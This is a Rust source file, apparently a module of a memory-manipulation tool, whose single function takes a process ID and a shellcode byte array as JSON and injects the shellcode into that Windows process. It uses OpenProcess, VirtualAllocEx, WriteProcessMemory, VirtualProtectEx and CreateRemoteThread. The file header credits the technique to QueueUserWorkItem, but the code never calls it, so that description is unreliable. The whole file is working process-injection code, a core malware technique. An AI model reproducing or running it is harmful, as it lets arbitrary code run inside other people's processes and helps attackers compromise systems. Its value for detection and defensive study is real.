//! Work Item Injection — inject shellcode via QueueUserWorkItem through CreateRemoteThread stub

use crate::error::MemoricError;
use crate::safe_handle::SafeHandle;
use serde_json::Value;

/// Work item injection: allocate shellcode in remote process, create remote thread to execute it.
/// Uses VirtualAllocEx(RW) → WriteProcessMemory → VirtualProtectEx(RX) → CreateRemoteThread.
pub fn work_item_inject(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
    use windows::Win32::System::Memory::{
        VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ,
        PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
    };
    use windows::Win32::System::Threading::{
        CreateRemoteThread, OpenProcess, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION,
        PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
    };

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing pid".to_string()))?;
    let shellcode_arr = args
        .get("shellcode")
        .and_then(|v| v.as_array())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing shellcode".to_string()))?;

    let shellcode: Vec<u8> = shellcode_arr
        .iter()
        .filter_map(|v| v.as_u64().map(|b| b as u8))
        .collect();

    if shellcode.is_empty() {
        return Err(MemoricError::InjectionFailed("Empty shellcode".to_string()));
    }

    tracing::warn!(
        "[INJECTION] Work item inject: {} bytes into PID {}",
        shellcode.len(),
        pid
    );

    unsafe {
        // Open target process
        let handle = OpenProcess(
            PROCESS_CREATE_THREAD
                | PROCESS_QUERY_INFORMATION
                | PROCESS_VM_OPERATION
                | PROCESS_VM_WRITE
                | PROCESS_VM_READ,
            false,
            pid as u32,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("OpenProcess failed: {}", e)))?;
        let handle = SafeHandle::new(handle);

        // Allocate RW memory in remote process
        let remote_mem = VirtualAllocEx(
            *handle,
            None,
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if remote_mem.is_null() {
            return Err(MemoricError::InjectionFailed(
                "VirtualAllocEx failed".to_string(),
            ));
        }

        // Write shellcode
        WriteProcessMemory(
            *handle,
            remote_mem,
            shellcode.as_ptr() as *const _,
            shellcode.len(),
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("WriteProcessMemory failed: {}", e)))?;

        // Change protection to RX (no write)
        let mut old_protect = PAGE_PROTECTION_FLAGS(0);
        VirtualProtectEx(
            *handle,
            remote_mem,
            shellcode.len(),
            PAGE_EXECUTE_READ,
            &mut old_protect,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("VirtualProtectEx RX failed: {}", e)))?;

        // Create remote thread pointing at shellcode
        let thread = CreateRemoteThread(
            *handle,
            None,
            0,
            Some(std::mem::transmute(remote_mem)),
            None,
            0,
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("CreateRemoteThread failed: {}", e)))?;

        let thread_handle = thread.0 as u64;

        Ok(serde_json::json!({
            "success": true,
            "technique": "work_item_inject",
            "allocated_address": format!("0x{:016X}", remote_mem as usize),
            "thread_handle": thread_handle,
            "shellcode_size": shellcode.len(),
            "pid": pid,
            "message": format!("Shellcode injected via work item pattern into PID {}", pid)
        }))
    }
}
